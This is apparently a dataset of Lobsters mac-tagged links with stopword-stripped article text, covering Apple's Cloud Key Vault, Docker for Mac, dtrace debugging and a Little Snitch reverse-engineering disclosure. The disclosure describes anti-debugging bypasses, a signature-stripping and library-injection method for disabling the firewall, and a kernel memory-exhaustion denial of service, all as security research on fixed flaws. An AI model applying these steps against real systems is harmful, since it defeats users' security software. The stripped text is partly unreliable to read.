547,Lobsters,mac,Apple macOS,"Apple at BlackHat: Reopening the ""Going Dark"" Debate",https://lawfareblog.com/apple-blackhat-reopening-going-dark-debate,apple blackhat reopening going dark debate,gave talk io keychain icloud keychain,week ago blackhat hacker convention la vega ivan krstić head security engineering architecture apple gave talk entitled behind scene io security slide available historic talk couple reason first apple traditionally secretive technically security device apple also announced first bug bounty program far newsworthy something else happened talk unbeknownst presenter anybody audience apple reopened going dark dispute fbi privacy community turned entire dispute head cold light day suspect apple u government privacy activist going rather unhappy digest sobering implication talk though likely upset entirely different reason short apple built thing privacy community saying year reckless dangerous impossible highvalue encryption key secured vault key stolen misused hacker malicious insider without hint selfawareness apple head security engineering architecture went way blackhat la vega boast getting ahead let start beginning breath krstić talk fantastically wide talked technically making iphone browser resilient zero day vulnerability apple new bug bounty program technical detail iphone us secure enclave processor defend lawenforcement repeatedly guessing pin break iphones design sharing saved password iphone mac apple intercept followed applevsfbisanbernardinoallwritsact case february may remember side discussion medium secure enclave processor tiny processor modern iphones cryptographically involved turning user pin code device encryption key unlock data iphone defend bruteforce repeatedly guessing pin code right one secure enclave maintains little counter number failed guess ten failed attempt permanently lock device forever destroying possibility decrypting user data another part talk really caught remark hidden slide icloud keychain backup rather technical need bit background let try explain apple long time iphone feature called io keychain feature let apps iphone browser remember saved website password credit card recently apple extended feature icloud keychain automatically synchronizing saved password mac computer order avoid uploading password icloud directly subpoenaable form apple first encrypts icloud security code practice almost always device pin code proceeds upload encrypted form icloud subtle problem setup apple needed solve normally fbi really hard time getting iphones secure enclave let try password really slowly even ten time user data becomes permanently inaccessible unless apple careful fbi would able something clever subpoenaed encrypted keychain file face thing file interesting lawenforcement encrypted user pin code fbi know user pin code fbi something file user device guess pin code time apple represents problem one resolved fix two slide later presentation apple solution cloud key vault calling cloud key vault complicated something understatement conceptually enormous secure enclave entire icloud datacenter normally iphone pin guess handled secure enclave processor secure enclave ensures ten failed guess permanently locked phone cloud key vault thing much larger scale cloud key vault manages pin guess uploaded encrypted file cloud key vault ensures ten failed pin guess data encrypted keychain file becomes permanently inaccessible fundamental purpose cloud key vault prevent apple employee hacker somehow hack datacenter employee compelled court order circumventing pin guess limit trying force open uploaded keychain file iphone synchronizes saved password user mac however two way cheat system apple thought first attacker could get ahold master encryption key hidden inside cloud key vault key fbi would able try pin guess without asking cloud key vault thus without limitation able guess pin ten time second way would replace upload new code cloud key vault instruct reset disable counter specific file fbi bruteforces pin apple defense attack ingenious company destroys access card device destroyed cloud key vault operates entirely autonomously according code written time started apple employee administrative access device reach take master encryption key reach reset failed pinguess counter file even upload new code device attempt would lead inevitably destruction masterkey thereby causing cryptographic selfdestruction uploaded keychain file devious defense robust design smart work built objectively work scale face secure hacker malicious insider courtorders thing apple intention building cloud key vault thwart pesky lawenforcement officer brandishing courtorders system represents big problem privacy community ongoing dispute fbi going dark debate compelling technical argument going dark technical frontdoor design technology community simply know securely store highvalue encryption key used stolen misused hacker malicious insider moreover many privacy advocate assert technical design look ok paper probably fall apart deployed scale practice apple blew argument water apple cloud key vault solves problem exactly building system even apple employee access compelled courtorder apple ironically seemingly inadvertently built system keep master encryption key sealed special vault technically prevents key stolen misused hacker malicious insider apple apple unintentional broadside privacy community best going dark argument way cloud key vault turn going dark dispute head cloud key vault also something sits unusual going dark nonadministrable sits uncomfortably way going dark debate presented public reason autonomous nonadministrable code nothing encryption past year much public discourse going dark rather craftily conflated going dark strong encryption clever framing error one lawenforcement never effectively rebutted error example data erasure involve encryption yet pose problem lawenforcement conversely http bank us strong encryption prevent lawenforcement investigating financial crime happen commit using bank website rather going dark much le strong encryption specific system design prevent lawenforcement gaining access information court order device encryption endtoend communication work deploying encryption configuration provider never see user content key going dark problem much le sophisticated involve encryption example simply choosing record relevant transaction log website thwart attempt lawenforcement obtain content would otherwise log autonomous nonadministrable code another example nonencryption category going dark problem apple inability help lawenforcement reset pinguessing counter exists counter intentionally inaccessible outside cloud key vault design nobody apple administer upload new code cloud key vault computer reset meaningfully new category problem normally going dark problem boil sorry content sorry key variant something else sorry data computer intentionally locked computer category raise lot new question technology company autonomous nonadministrable code raise lot opportunity hold process data way hacked example technology company could use autonomous nonadministrable code scan user content advertising keywords without ever exposing usercontent application developer malicious insider someone hack server lawyer question secure enclave interact order writ act much burden undue burden come compelling apple disarm cryptographic selfdestruct cloud key vault design like u government many new question new category going dark raise start become widely adopted cloud provider context particular possibility company might able hold process user data without company staff hacker lawenforcement officer courtorders able gain access data hold potential seismically shift lawenforcement ability obtain data cloud provider suspect apple head security engineering architecture stood go stage blackhat none going head team built several cool idea securing apple device hacker overseen construction ingenious design keep fbi icloud file make news announcing apple first ever bug bounty program little know also turn much know going dark head reopen pandora box
548,Lobsters,mac,Apple macOS,Apple's default Python only supports antiquated SSL,https://github.com/Homebrew/homebrew-core/issues/3541,apple default python support antiquated ssl,join github today sign reload reload,dismiss join github today github home million developer working together host review code manage project build software together sign perform action time signed another tab window reload refresh session signed another tab window reload refresh session
549,Lobsters,mac,Apple macOS,First Touch Down with Docker for Mac,http://blog.hypriot.com/post/first-touch-down-with-docker-for-mac/,first touch docker mac,first touch docker mac access beta program http betadockercom download install docker mac using docker mac first time let start real docker container email protected email protected email protected email protected magic behind scene xhyve bhyve alpine linux another big arm surprise easter egg tweet hypriotdemo challenge dockercon fantastic docker fu key takeaway gitter channel hypriottweets comment powered disqus comment powered,first touch docker mac sun mar day ago docker announced closed beta program new application docker mac docker window apps meant simplify usage docker container every developer even try lower barrier install use docker desktop laptop computer mac window user soon received first rumor special feature builtin also simplify developer workflow iot application getting totally thrilled registered immediately beta program really hard wait luckily received email beta invitation access token within hour like give first insight view install use docker mac basic walkthrough macbook pro running latest o x please join access beta program easily register docker beta program http betadockercom logged docker id literally docker hub user account apply testing docker mac docker window closed beta get waiting list hopefully selected soon please patient receive invitation email detailed instruction personal access key blog post show easy install use docker o x guess write another post later curious window user download install docker mac selected beta receive email titled docker private beta link download page access key download installer package called dockerdmg mac double click drag drop docker beta app application folder lauchpad start docker beta app directly first time begin right away using docker mac start beta docker app first time asked enter personal invite token token accepted docker app need additionally install network helper request privilege enter credential grant privileged access success docker app installed easily find access clicking little neat whale icon using docker mac first time use docker start terminal window use docker cli access local docker engine first get version docker command determine version docker client docker engine display detailed information installed docker software let start real docker container first check host operating system look like uname darwin demolocal darwin kernel version fri feb pst root already expected see host o o x darwin kernel version cpu architecture indicates running intelbased cpu second let start basic linux container using debian standard distro take second docker engine fetchdownload docker image debian docker hub docker run rm ti debian unable find image debian latest locally latest pulling librarydebian pull complete pull complete digest status downloaded newer image debian latest email protected see interactive bash prompt within running debian linux container email protected uname linux smp sun mar utc gnulinux email protected cat etcosrelease prettyname debian gnulinux jessie name debian gnulinux versionid version jessie iddebian homeurl http wwwdebianorg supporturl http wwwdebianorgsupport bugreporturl http bugsdebianorg email protected like start really tiny linux container next start even faster debian alpine linux meant supersmall brings lot advantage container world starting interactive alpine container pretty much debian use bourne shell instead bash docker run rm ti alpine sh unable find image alpine latest locally latest pulling libraryalpine pull complete digest status downloaded newer image alpine latest see container running kernel version like us completely different linux distribution uname linux smp sun mar utc linux cat etcosrelease name alpine linux idalpine prettyname alpine linux homeurl http alpinelinuxorg bugreporturl http bugsalpinelinuxorg let look detail docker container complete linux system substantial difference size docker image repository tag image id created size alpine latest week ago mb debian latest week ago mb alpine linux damn small size thus docker image built upon alpine extremely small well much faster download another major advantage security model alpine linux reduces attack surface dramatically provides faster easier security update well experiment docker mac clearly demonstrates run linux command inside docker container linux o recent kernel version indeed different host operating system o x pure docker container magic running linux container seamlessly development machine macbook pro retina mid magic behind scene shown screenshots host operating system docker client running o x docker engine run maybe wondering even possible right answer quite easy docker mac shipping lightweight hypervisor called xhyve port bsd hypervisor bhyve o x engineer docker greatly enhanced xhyve enable optimized usage efficiently run docker container o x inside xhyve hypervisor docker engine running tiny small linux vm based upon alpine linux distribution great combination outstanding technology user get feeling run docker container natively mac honestly even great technical detail packed new docker mac release keep later advanced technical blog post another big arm surprise public announcement docker mac received easter egg tweet one docker engineer anil madhavapeddy included another cool feature attracts promised could even run docker image built iot device like raspberry pi mac way sound good true mainly raspberry pi us arm cpu executed intelbased mac right test select one famous docker container webserver presented dockercon san francisco ca last year june detail found dedicated blog post hypriotdemo challenge dockercon ok go let run arm container mac see work maybe magic docker spell could done magic happens bindmounting special binary original armbased container change original docker image get done end really able run arm container built raspberry pi intelbased mac help fantastic docker fu embedded docker mac last proof check docker p running original arm container june possible docker engineer already included linux kernel support binfmtmisc docker mac long right qemu interpreter qemuarmstatic intel binary placed arm container container executed better emulated even foreign cpu architecture clearly imagine use docker mac part new dockercentric workflow build iot container directly mac development testing done fast efficiently developer machine deploying running iot container target device month ago idea sound pretty crazy unbelievable coming true soon special thanks anil justin great guy docker engineering team make magic true key takeaway first fast walkthrough guess even curious like use docker mac meantime summarize key point impressed great new release installing docker mac pretty easy slick single dmg medium mbyte docker mac real native o x application absolutely external resource dependency install docker mac integrates perfectly development workflow downloading installing running first docker container take minute tiny container alpine linux one best linux distros arm iot container developed run even mac revealed later blog post please send u feedback gitter channel tweet thought idea project hypriottweets dieter please enable javascript view comment powered disqus comment powered
550,Lobsters,mac,Apple macOS,Debugging using system calls in Mac OS X,http://bryce.is/writing/code/macosx/debugging/udp/sockets/dtruss/dtrace/eaddrinuse/2016/07/30/debugging-using-system-calls.html,debugging using system call mac o x,understanding udp go system call dtruss dtrace conclusion mutex,today want talk issue udp socket go learned program making use two tool ship mac o x called dtruss dtrace programming mac working project written go make use udp socket trying add unit test code decided create one around reconnections test created two socket localhost two different port readwrote closed repeated several hundred time eventually would receive bind address already use error upon creation socket wondered happening closing socket understanding udp go go use netlistenpacket method start listening udp packet given network address function return netpacketconn interface according go documentation packetconn close method either close connection return error type packetconn interface close close connection blocked readfrom writeto operation unblocked return error close error true getting eaddrinuse error time investigate first brief recap system call system call system call way program interface operating system unixbased system specifically compiled code contain software interrupt passed value corresponding function kernel case interested two system call bind close bind assigns file descriptor network address close deallocates file descriptor see program making system call like bind close dtruss dtruss tool ship mac o x written brendan gregg similar strace linux system use see system call program making kernel mean see program attempting close socket expect fact go standard library lying u running dtruss see something like sudo dtruss bind go test run testreconnect pidthrd relative elapsd cpu syscall args return close socket fcntl fcntl fcntl setsockopt bind err see bunch interesting information thread making syscalls long taking argument called return value one interesting thing last line end see err bind address already use error particular trace see first line look like close socket error last line say already use try bind confusingly refers file descriptor actual network address network address stored second argument pointer sockaddr struct passed kernel dereferenced would look something like struct sockaddr safamilyt safamily char sadata byte protocol address part interested sadata field need dereference pointer somehow possible enter dtrace dtrace dtrace powerful debugging tool originally built sun microsystems solaris also available mac o x amazing thing dtrace ship scripting language called script write tracing program execute upon entryreturn specified system call using actually write tracing around bind dereference sockaddr struct ultimately find port bound dtrace c go test run testreconnect n bind entry trace trace copyinstr f bind command saying execute go program whenever see bind system call invocation run script script tracing first two argument second argument tracing result function called copyinstr copyinstr function dereference pointer user space output result string running dtrace argument give something like bind entry b c e f end first line see file descriptor used like next line see output copyinstr dereferenced pointer sockaddr struct look like mostly unused memory look byte output see port number socket see file descriptor binding port whew using tool able see fact existing file descriptor still bound port subsequent bind call made conclusion digging go standard library eventually found answer go documentation mention blocked readfrom writeto call unblocked return error fails mention happens go close socket meaning even calling close netpacketconn guarantee socket actually closed due mutex around underlying file descriptor go solution case use semaphore code ensure readfrom writeto call returned attempting open new socket port important thing exercise able know certain understood program operating system mean could confident problem sitting layer stack happy debugging
551,Lobsters,mac,Apple macOS,Shut up snitch! - reverse engineering and exploiting a critical Little Snitch vulnerability,https://reverse.put.as/2016/07/22/shut-up-snitch-reverse-engineering-and-exploiting-a-critical-little-snitch-vulnerability/,shut snitch reverse engineering exploiting critical little snitch vulnerability,iokit kernel heap overflow fixed rare issue could cause kernel panic little snitch little snitch little snitch implemented socket filter network kernel extension programming guide pf sfltregister sfattach sonke cookie sfltregister sfltglobal filter tied specific domain type protocol tcplognke sample code revisiting mac o x kernel rootkits antidebugging measure little antidebugging kernel authorization subsystem kauth kauthprocesscantrace authorizes whether current process trace target process type proct process traced type int pointer errnostyle error code listener denies request must set value nonzero value dtrace kauthlistenscope kauthlistenscope kauthlistenscope init start init ptdenyattach ptdenyattach q note ptdenyattach request operation used traced process allows process currently traced deny future trace parent argument ignored process currently traced exit exit status enotsup wise set flag denies future trace attempt parent trace process set flag result segmentation violation parent sysctl sysctlpointer null dlsym dlsym sysctl note ptdenyattach ptrace onyx black cat ptrace sysctl socket filter cooky attach callback connectout callback allocatenewcookie connectout callback connectout callback connectout showsockaddrin rdx io kit little snitch io kit driver bsd introduction iokit fundamental comapple simpleuserclient little snitch class atobdevlsnke infoplist const ioservice atobdevlsnke const init start init start atobdevlsnke probe start stop terminate finalize iouserclient exchange data kernel userland io kit bidirectional communication channel iouserclient ioserviceopen atobdevlsnke ioservicegetmatchingservice ioservicegetmatchingservices ioserviceopen ioserviceopen initwithtask newuserclient atobdevlsnke newuserclient initwithtask initwithtask start initwithtask initwithtask initwithtask function ioconnectcallscalarmethod const const externalmethod externalmethod gettargetandmethodforindex externalmethod ioconnectcallscalarmethod rdx ioexternalmethodarguments paper section arbitrary client connect little snitch driver disable time check time use time use time check newuserclient initwithtask initwithtask initwithtask iouserclient clientdied newuserclient kioreturnnotpermitted dyldinsertlibraries dyldinsertlibraries dyld restrict restrict dyld restrict blogpost macho restrict hardkill exploit vulnerability macho optool machoedit hardkill restrict ioserviceopen data exchanged kernel user application iouserclient iouserclient iodataqueue ioshareddataqueue iodataqueue mach message following registernotificationport clientmemoryfortype initwithtask initwithtask iodataqueue start ioserviceopen iodataqueue iodataqueues ioreg enqueue connectout externalmethod rsi currentconnectionstructptr fgcalluserlanddecision currentconnectionstructptr wakeup msleep waitnotificationloop newkextnotification iodataqueue iodataqueue conclusion released,little snitch among first software package tried reverse crack started using mac past reported weakness related licensing scheme never audited kernel code since fan iokit reversing upcoming def con presentation little snitch resparked curiosity last week finally time give firewall closer look little snitch version released january fix kernel heap overflow vulnerability despite mentioned release note fixed rare issue could cause kernel panic hopefully little developer revise policy clear vulnerability address user better understand threat posture interesting security issue remaining version current time research u find reading answer yes little snitch little snitch application firewall able detect application try connect internet network prompt user decide want allow block connection attempt superuseful addition o x directly observe control network traffic mac expected unexpected widely popular personally make sure first thing install configuring new o x image little snitch implemented o x feature make little snitch possible called socket filter complete description implementation guide socket filter network kernel extension programming guide following diagram document describes implementation networking stack essentially filter allow u access information incoming outgoing network connection make decision allowblock connection parentprocess information available making easy implement example sniffer application application firewall like little snitch two filter available ip interface allow filtering traffic ip interface level le interesting application like little snitch filtering level probably better achieved operating pf firewall install new socket filter call sfltregister function associated kernel extension first argument function structure configure callback want sfattach callback execute filter attached socket depending configuration happens every new created socket socket filter installed specific socket using custom sonke socket option callback create cookie store userdefined data related socket example process pid created socket cookie available subsequent callback first argument callback access sfdatain sfdataout callback triggered incoming outgoing data allowing u filter data transit sfconnectin sfconnectout callback allow u filter creation incoming outgoing connection using little snitch kernel import table locate sfltregister function easily find kind functionality implement looking installed callback little snitch interested filtering every new socket created installed using sfltglobal option configures available callback finally register filter loop visible disassembly installing many filter reason filter tied specific domain type protocol meaning every possible socket configuration must specified want filter every possible type network connection little snitch designed example tcplognke sample code find two filter one another specific socket type shown code comment find additional information socket filter revisiting mac o x kernel rootkits phrack article section show locate dump kernel structure associated socket filter attackbypass kernel rootkit perspective socket filter interesting powerful o x feature interested playing start tcplognke source code implement packet reinjection code old still best reference date antidebugging measure one first blog post little antidebugging measure information still accurate today revisit moment since new trick inside kernel extension kernel authorization subsystem kauth support installation listener process scope control process trace debug process documentation discus following action available process scope kauthprocesscantrace authorizes whether current process trace target process type proct process traced type int pointer errnostyle error code listener denies request must set value nonzero value practical meaning installed listener able control whether process typically debugger debug another process little snitch us feature protect process debugger code injector anything else need attach process including dtrace kauth listener installed using kauthlistenscope function easily trace driver call first allocates memory structure described code comment contains four function pointer last four structure field unknown data first field contains total number running process second parameter kauthlistenscope callback found address identified ida pointing address interesting thing fake nonfunctional callback insert breakpoint address never hit try attach debugger one protected little snitch process happening function two code reference fake callback another function look second function contains exactly code fake callback happening callback pointer address second parameter kauthlistenscope pointing address fake callback replaced pointer function address real callback replacement function shown one key question pointer switch happen listener already installed could dangerous operation since code lock interrupt enabled crash could happen little snitch developer exactly newbie trade potential kernel panic clever trick answer lie code reference pointer exchange function called init method see previous picture code xref listener installed function call start method address trick init method guaranteed called method class meaning pointer switch always occurs first fool static analysis carelessly neglect look disassembler code reference cute trick could improved obfuscating listener install function via function pointer two known antidebugging trick used little user application ptdenyattach amibeingdebugged ptdenyattach description found man page technical q note ptdenyattach request operation used traced process allows process currently traced deny future trace parent argument ignored process currently traced exit exit status enotsup wise set flag denies future trace attempt parent trace process set flag result segmentation violation parent symbol used antidebugging trick found import table resolved runtime string also obfuscated obscure happening following disassembly output come little snitch daemon binary show call sysctl antidebug facility implemented avoid resolving sysctl symbol every time used pointer stored global variable labeled sysctlpointer beginning code snippet see pointer tested null value null mean symbol yet resolved need done resolve symbol first step deobfuscate string since dlsym need symbol string second parameter following screenshot show obfuscated string deobfuscated version found various little snitch binary string deobfuscated symbol resolved via dlsym function pointer stored global variable finally code executes sysctl function pointer compare disassembly note sample code conclude code implementing described antidebugging trick ptrace ptdenyattach antidebugging trick follows next verify function pointer deobfuscate string resolve symbol call ptrace function pointer sysctl ptrace antidebugging trick bypassed kernel extension onyx black cat breakpointing ptrace sysctl function fixing return value valid starting application debugger attaching alreadyrunning process another alternative patch remove kauth listener kernel debugger another kernel extension socket filter cooky fully reverse structure definitely interesting future work understand kind data little snitch us internally filter decision cookie size version byte slightly different older version came following crude structure description observe cookie lifecycle opening connection telnet two breakpoints one attach callback another connectout callback cookie created attach callback able see cookie connectout callback telnet try establish connection function allocates new cookie address used attach callback next screenshot kernel debugger session breakpoint set return address allocatenewcookie function call process pid extracted cookie structure soon telnet try establish connection hit breakpoint connectout callback cookie first argument verify telnet process pid connectout callback prototype observe argument useful extract socket information example display ip address process trying connect third argument using small gdb scripted command work need use kernel debug package available developer download portal requires free registration apple developer contains structure definition assist gdb lldb set breakpoint connectout use gdb script showsockaddrin rdx display target network address useful distinguish connection debugging specific binary connection io kit little snitch previously referred little kernel code kernel extension technically implemented io kit driver instead bsd kernel extension io kit objectoriented framework developing device driver based restricted subset c bsd kernel extension typically developed c following apple document introduction iokit fundamental good reference introduction io kit preference c development language guess little snitch developer chose io kit driver capable loaded early boot process kernel extension longer ability afaik previously bypass using comapple identifier mandatory kernel codesigning enforcement killed socket filter implemented io kit driver bsd kernel extension another reason choose io kit class implement data exchange user process kernel socket filter implemented kernel level little snitch user make decision connection dialog running user level data need exchanged driver little daemon application come good source code example learn data exchange simpleuserclient little snitch class load little snitch kernel driver disassembler ida used screenshots notice class named atobdevlsnke main class driver also observe driver infoplist content class information extracted const section observe parent class ioservice little snitch override ioserviceprovided method extremely useful understanding design following picture describes atobdevlsnke class reverse engineered const section information match saw previously antidebugging pointer switching trick init start method overridden init call function exchange pointer driver start real kauth listener installed start method trick rebuild class disassembly output ida identifies overridden method yellow color reference code implemented driver pink color identifies class method overridden information easily reconstruct class structure partial picture atobdevlsnke class observe probe start stop terminate finalize method overridden little snitch class use technique identify class created little snitch two class whose parent class iouserclient three class subclass following picture describes class method overridden others added little snitch developer subclass override method also add new one maybe also overridden parent class reason different class used different userland client little snitch daemon little snitch agent little snitch configuration little snitch network monitor implement different feature specific userland client class serf specific purpose thus slightly different interesting way explain later exchange data kernel userland io kit previously stated little design implementation must provide method data exchange kernel user application application want establish network connection socket filter intercept send data connection user daemon generates user alert probably relayed internally agent since daemon run root user click button make decision connection decision relayed back kernel little snitch implement bidirectional communication channel one user application kernel another kernel user first request always user application initiated used transmit data kernel receive data kernel possible request send data receive data second channel kernel initiate data transmission technically notifies user application data ready read scenario need second channel since polling used ask kernel new data available might efficient scenario surprise little snitch design us kind see later start reversing connection made user application driver io kit class implement feature iouserclient parent class class simpleuserclient code us communicate driver user client application connection user application established using ioserviceopen function one parameter service want connect specifically class atobdevlsnke service found using ioservicegetmatchingservice ioservicegetmatchingservices one return iterator object traverse following code snippet show open connection little snitch driver third parameter ioserviceopen integer defining type connection created little snitch implement five different type used distinguish different client find client type need disassemble binary trace call ioserviceopen little snitch daemon support two connection type plus one type remaining little snitch application agent network monitor configuration take look software update uninstaller establishing connection user application pretty simple elegant see happens kernel side following picture show log simpleuserclient driver loaded user client connects little snitch class override initwithtask method since interested something specific new client connects client get class interesting kernel method executed newuserclient little snitch also override saw atobdevlsnke class definition method instantiates new user client object third parameter client type depending client type newuserclient instantiate new object class initwithtask called picture show switch statement based client type parameter added note regarding client type instantiated class observe initwithtask start called directed different address based class object belongs find target address indirect call use kernel debugger breakpoint examine final call address compute class information since know class object belongs offset value first call address need find base address class add offset method call referring base address class adding offset give address location initwithtask method overridden point towards initwithtask address shown class definition override initwithtask method reason little snitch agent configuration monitor share initwithtask class initwithtask implementation able map class used client type point connection established user application kernel driver next step data sent user application received kernel achieved implementing method user client class ioregistrydescriptorc class called user application expose whatever service kernel driver want provide user client invoke method user application us certain function allow passing variablesized array integer structure kernel also receive type data kernel function ioconnectcallmethod ioconnectcallstructmethod ioconnectcallscalarmethod complementary async version three example query current little snitch filter status assuming valid connection driver use following code case output type method meaning kernel send u data output array pas ioconnectcallscalarmethod request little snitch implement method find method driver code found const section array element following structure first element pointer kernel method receive user application request remaining field contain size input output data user application sending requesting one way locate array go const section visually look kind structure hard locate write script try locate kind structure array j serna another simpler trick locate externalmethod implementation reference array externalmethod new kpi support process older gettargetandmethodforindex support process case externalmethod method located byte start class definition first four ioregistrydescriptorc class implement method special support method four externalmethod implemented function address reference array address next screenshot show part array note think method implemented little snitch point function address return zero method return filter status number take look implementation code retrieves status driver internal structure writes scalar output buffer user buffer passed ioconnectcallscalarmethod function rdx parameter ioexternalmethodarguments structure offset corresponds scalar output pointer generally method one main thing want fuzz io kit driver since input data user controlled security researcher demonstrated ian beer project zero particular tends verified recipient find paper paper section recent one missing finished fuzzing method code appears robust example pas bogus data method network traffic machine blocked little snitch stopped restarted agent menu little snitch developer confirmed expected behavior response bogus data discovered behavior directly via fuzzing method quite interesting method allows userland application enabledisable little snitch filtering lead next question interesting arbitrary client connect little snitch driver disable well sort else reading blogpost little snitch implement driver check attempt restrict driver connection particular user application hash binary client trying connect driver verify match hardcoded whitelist authorized little snitch binary problem design suffers toctou bug time check time use precise toutoc bug time use time check bug allows u bypass check run arbitrary code inside little snitch binary achieve injecting dynamic library little snitch process connect driver call disable driver method legit user application detect change polling driver status assume application able control driver implementing polling could future improvement little snitch might also possible inject new firewall rule tested scenario look driver implementation understand bug remember user application try connect driver method newuserclient called first instantiate correct class call class method initwithtask override initwithtask call initwithtask method take look implementation verify client connection analyze later since introduces do vulnerability first check see user application client died verify iouserclient clientdied method function client verified return value zero mean client authorized connect newuserclient deny connection returning value kioreturnnotpermitted return value one mean client connection proceed easily verify inserting breakpoint address verify return value little snitch binary custom binary patched little snitch binary verify function huge interested fully reversing priority understand everything need understand output given different input sometimes need reverse everything assume blackbox map input output save time effort important thing beginning research project observe verify function support different client type address jump table target address comment appears hash code reference function family seen function one easy way bypass check inject dynamic library authorized process able easily easiest way achieve inject library using dyldinsertlibraries environment variable remember code injection attaching process protected kernel little snitch developer obviously aware block dyldinsertlibraries injection using dyld linker feature restrict segment restrict section exist dyld load library specified aforementioned environment variable effectively block easy injection vector little snitch process good description dyld restrict feature please refer blogpost could bypass restriction editing binary macho header renaming restrict segment single bit flip enough problem modify hash fail verification subsequently o code signature verification binary set hardkill code signature verification fails meaning process killed immediately exploit vulnerability recap situation know logic mistake way user client application verified driver client verified try establish connection driver never little snitch binary also configured deny library injection killed o x code signature verification fails first thing eliminate o x code signature little snitch binary reason driver application ignore official code signature operating system look try load binary driver simply remove code signature binary gatekeeper interference binary already installed longer quarantined easiest way strip code signature edit number load command size macho header configure header one le command specifically code signature command o x interpret binary code signature super easy trick possible code signature last command header common case optool machoedit utils support removing code signature case since got rid potential hardkill also modify header remove dyld injection protection modify name restrict segment allows u finally fully control little snitch code injected library modified binary driver client verification still fail vulnerability becomes obvious hindsight always check occurs try connect driver via ioserviceopen shall revert whatever patched binary connecting everything look intact driver read file hash content quite simple quite powerful since little snitch filesystem permission correctly configured written regular user merely need make copy application want attack modify inject library library open binary restore patched byte open connection free use code connect driver issue command reuse application function remember full arbitrary code execution within application context whatever want probably easiest way exploit logic vulnerability might good exercise try possibility releasing exploit source code story end extra step code connect driver going discus essentially requires two method reversed code reusing application code called issue disable driver command leave exercise reader truly interested writing exploit bug data exchanged kernel user application seen user application send receive data kernel via iouserclient class able pas receive data either integer variable array structure kernel able send data user application without poll via iouserclient little snitch implement feature using iodataqueue class deprecated favor ioshareddataqueue class follow o x security ring bell since exploited ian beer past iodataqueue class documentation describes nicely give u right tip reverse little snitch implementation generic queue designed pas data kernel user process iodataqueue class designed allow kernel code queue data user process iodataqueue object designed used single producer single consumer situation lock data kernel enqueue userspace dequeue method follow strict set guideline lock necessary maintain integrity data struct data entry variable sized entire size queue data region including overhead entry must specified front order iodataqueue instance notify user process data available notification mach port must set queue empty new entry added message sent specified port user client code exists iokit framework facilitates creation receive notification port well listen process new data available notification order make data queue memory available user process method getmemorydescriptor must used get iomemorydescriptor instance mapped user process typically clientmemoryfortype method iouserclient instance used request iomemorydescriptor return mapped user process iodataqueue create variablesized shared memory segment kernel user application kernel notify user application data available via mach message following apple mailing list post describes necessary step implement driver user application know class implement feature override registernotificationport clientmemoryfortype method also initwithtask take look initwithtask method find anything related iodataqueue relevant portion instead found start method every time user application try connect driver using ioserviceopen type new iodataqueue created kernel lead u another vulnerability denial service reason someone forgot class attempt validate user client mean create small user application nothing open connection driver type creating thousand iodataqueues exhaust kernel memory happens system simply hang kernel panic virtual machine memory exhausted le minute mac pro ram take around min using single thread core probably used kill much faster case kernel finally panicked via watchdog time method responsible enqueueing kernel data located find class definition computing offset class definition get value use locate caller method searching offset disassembly method address another method class us offset call searching offset since next method class one interesting hit function looking code reference see called socket callback use ioreg cmd line utility verify using service little snitch daemon connection five precise peek data sent adding breakpoint enqueue method going describe one thing missing analysis data sent connection initiated seen code reference data enqueue connect socket filter reference connectout callback first hit get attach callback try connect somewhere function address responsible tested skip play return result function huge many call function fully reversed yet reference following source code file userskarldeveloperprivatprojectssnitchlittlesnitchlskernelextensionallowc look like pretty good candidate looking reference see data socket filter also using reason rule deleted connection authorized established trigger new user approval request obviously good design one thing know connectout filter using function enqueue data patch call enqueue data alert still show writing paragraph curiosity flared decided try find data sent user application new connection decided trace method called user client done breakpointing externalmethod method address examining value rsi register current method number two interesting method used new connection created since method hit start code small contain much interest except call function address structure output method structure byte long quite significant amount data function copy value internal structure different output structure determine meaning output structure kernel debugger get following incomplete definition path explains large size structure modify content kernel breakpoint get modified information displayed user alert clearly code information sent user application let remind method user application initiated contrary previous statement indeed kind polling user application new connection interesting understand implemented important clue label currentconnectionstructptr trick pointer structure contains information new connection test observe variable two state value zero meaning new connection pointer allocated memory structure experiment different connection get different value hypothesis implement serial queue design guarantee guaranteed synchronization new connection user decision queueing event bring improvement since user make decision case case tried find pointer set confirm happens somewhere inside big function one called fgcalluserlanddecision reference breakpoints would never trigger reason another pointer currentconnectionstructptr point back one used update new connection new connection set made ready user application grab via method complete theory memory allocated structure need find value initially set need go way back code point breakpoint compare allocated pointer one copied method see match starting make sense patch execute nothing happens user application data created new connection finally last piece puzzle method used retrieve information new connection user application know execute without polling breakpoint method triggered new connection happens polling answer lie bit forward function kernel thread sleep waiting modification structure pointer moment kernel waiting user make decision current new connection decision made kernel thread resume still explain lack polling answer byte previous code snippet argument wakeup receives channel case pointer address mean function wakeup kernel thread sleeping msleep look reference channel get data reference function responsible sending thread sleep function referenced method one little snitch method defined class called method number explains saw method tracing new connection puzzle finally solved happens little snitch daemon us method retrieve new connection data kernel us method signal data need sending respective thread sleep new connection happens kernel signal daemon thread waiting notification wake daemon executes method retrieve new connection data user making decision kernel thread corresponding new connection sleep response application thread execution blocked little snitch response timeout observe happens user application taking sample little snitch daemon address aslred address sample function little snitch daemon executes method function called method named waitnotificationloop contains next call another method called newkextnotification mystery finally solved see little snitch guarantee serial decision new connection guarantee process anything connection user make decision assuming bypass vulnerability theory iodataqueue could used task think design still present devised iodataqueue became available left one thing analysis happens rule temporary permanent either kernel cache rule avoid querying rule userland query userland every every connection sound performant example rule deleted method executed user application interesting clue understand process conclusion finally end long interesting reverse engineering blog post reversed little snitch kernel component internals design disclosed two vulnerability critical one allows bypass disable little snitch protection simple denial service hang kernel panic host machine little snitch developer objective development already released version fix problem hat tip quick fix turnaround pleasant nodrama email exchange regarding issue update copy little snitch soon possible naturally people wonder use little snitch since reality increase potential attack surface easy question answer personally still think useful piece software remain user like every piece software important security software need external audit user assume security software received security scrutiny common assumption practically impossible objective development opensource product look amount people trying pirate better understanding internals grab disassembler debugger continue audit software hope enjoyed fun fg
